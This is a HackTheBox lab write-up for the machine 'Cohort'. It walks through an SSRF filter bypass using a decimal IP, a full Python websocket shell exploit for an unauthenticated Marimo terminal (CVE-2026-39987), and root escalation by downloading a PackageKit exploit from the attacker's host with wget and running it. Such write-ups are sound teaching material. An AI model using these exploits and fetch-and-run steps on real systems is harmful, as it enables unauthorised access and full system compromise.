---
title: HTB · Cohort
slug: htb-cohort
date: 2026-08-21
image: cohort
platform: HackTheBox
os: Linux
difficulty: Easy
points: 585
tags: [hackthebox, linux, easy, active, ssrf, cve-2026-39987, websocket, cve-2026-41651, packagekit]
description: Cohort is a Linux machine on HackTheBox centered on exploiting an exposed web service to gain a foothold, then escalating to root by recovering leaked credentials/keys. Foothold comes from enumerating the application, and privilege escalation abuses a misconfigured recovery/key-management flow.
featured: true
---

# Reconnaissance
## Staged Nmap Scanning
```bash
nmap -p- --min-rate 10000 10.129.69.148
nmap -p 22,80,443 -sCV 10.129.69.148
```
### Initial Scan Results
```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
| Not valid before: 2026-06-01T18:47:07
|_Not valid after:  2126-05-08T18:47:07
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Hosts File
The website uses a virtual host. I'll add it to `/etc/hosts`:
```bash
echo "10.129.69.148 cohort.htb" | sudo tee -a /etc/hosts
```
---
# Web Exploitation
### Enumeration
Let's fire up ffuf and do some directory enumeration.
```js
ffuf -u http://cohort.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic 
```
After enumeration, we got an interesting directory called /status, which we don't have access to.
### SSRF
In the website there is a interesting button called `Open Client Insights`, after clicking it it takes us to `https://cohort.htb/portal.html`.
The portal allows setting a **Source URL** which the backend fetches - confirming an SSRF by pointing it to a controlled server.

---
Attempting to access internal/loopback targets is blocked: `For security, internal and loopback addresses are rejected.`
But we can easily bypass that by just encoding `127.0.0.1` as a **decimal IP**: `2130706433`
```js
http://2130706433/
```
---
### Internal Enumeration via /status 
Remember the `/status` directory that we couldn't enter, now is the time to do it.
```
http://2130706433/status
```
It leaks internal routing configuration:
```json
{"service":"cohort-edge","status":"ok","generated_by":"nginx","upstreams":[{"name":"marketing","host":"cohort.htb","root":"/var/www/cohort"},{"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},{"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888","note":"internal analyst workspace, not for external use"}]}
```
### Key information
- **Internal vhost:** `nb-1be3782a8afd3ad5.cohort.htb`
- **Internal target:** `127.0.0.1:8888`
- Looks like an internal notebook platform.

---
# Foothold
First let's add the internal vhost that we got earlier to `/etc/hosts` and visit the website.
```bash
echo "10.129.69.148 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts 
```
It shows a Marimo login page requiring an Access Token.
After a little bit of research i found a critical issue regarding Marimo.
[CVE-2026-39987](https://github.com/advisories/GHSA-2679-6mx9-h9xc) is a terminal websocket missing authentication exploit.
The terminal WebSocket endpoint accepts connections without auth and spawns a PTY shell.
**Exploit idea:**
- Connect to the WebSocket endpoint
- Send commands interactively
- Get a shell as the notebook use

---
### Exploitation
Now let's craft an exploit.
```python
#!/usr/bin/env python3
import asyncio
import websockets
import ssl
import sys
import threading

async def reader(ws):
    while True:
        try:
            msg = await ws.recv()
            print(msg, end='', flush=True)
        except:
            break
async def writer(ws):
    while True:
        try:
            cmd = await asyncio.get_event_loop().run_in_executor(None, input, '')
            await ws.send(cmd + '\n')
        except:
            break
            
async def interactive_shell(target):
    ws_url = target.replace('https://', 'wss://') + '/terminal/ws'
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    async with websockets.connect(ws_url, ssl=ssl_context) as ws:
        await asyncio.gather(reader(ws), writer(ws))

if __name__ == "__main__":
    asyncio.run(interactive_shell(sys.argv[1]))
```
And then run:
```js
python3 exploit.py https://nb-1be3782a8afd3ad5.cohort.htb
```
And we got a shell as `marimo@cohort`.
Let's upgrade TTY and grab the user.txt flag.
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

cat user.txt
```

---
# Privilege Escalation
While enumerating local packages and services, PackageKit stood out:
- PackageKit `1.2.8-2ubuntu1.2`
- Vulnerable to [CVE-2026-41651](https://github.com/Vozec/CVE-2026-41651) (_Pack2TheRoot_)
- TOCTOU chain in transaction handling allows bypassing authorization → gain root via crafted installs.
### Exploitation
Let's start a python http server first on our machine and transfer the exploit to the `cohurt` machine.
```python
python3 -m http.server 8000
```
And on the `cohurt` machine:
```bash
wget 10.10.14.12:8000/cve-2026-41651
chmod +x cve-2026-41651
./cve-2026-41651
```
And as a result it creates a **SUID bash** and spawns a root shell via effective UID: `uid=1000(marimo) gid=1000(marimo) euid=0(root)`
And now that we have root we can grab the root flag:
```bash
cd /root
cat root.txt
```
